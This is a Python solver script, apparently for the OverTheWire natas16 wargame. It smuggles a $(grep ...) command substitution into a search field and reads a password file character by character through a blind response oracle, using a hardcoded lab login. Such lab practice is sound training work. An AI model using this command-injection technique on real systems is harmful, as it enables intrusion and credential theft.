import requests
import string

target = "http://natas16.natas.labs.overthewire.org/"
# Replace with natas16 password
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
password = ""


def injection(prefix: str, nextChar: str):
    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
    return {'needle': f'$(grep -E ^{prefix}{nextChar}[[:alnum:]]* /etc/natas_webpass/natas17)'}


for i in range(len(password), 32):  # 32-character password
    test_data = {
        'needle': f'$(grep -E ^{password}[[:alpha:]][[:alnum:]]* /etc/natas_webpass/natas17)'}
    test_r = requests.post(
        target, injection(password, '[[:alpha:]]'), auth=auth)
    chosen_chaset = string.ascii_letters
    if "African" in test_r.text:
        chosen_chaset = string.digits
    else:
        test_r = requests.post(
            target, injection(password, '[[:upper:]]'), auth=auth)
        chosen_chaset = string.ascii_uppercase if "African" not in test_r.text else string.ascii_lowercase

    best = None
    for char in chosen_chaset:
        r = requests.post(target, injection(password, char), auth=auth)
        if "African" not in r.text:
            best = char
            break
    if best is None:
        print("Error, last request received: ", r.text)
        break
    password += char
    print(f"Progress: {password.ljust(32, '*')}")

print(f"Final password: {password}")
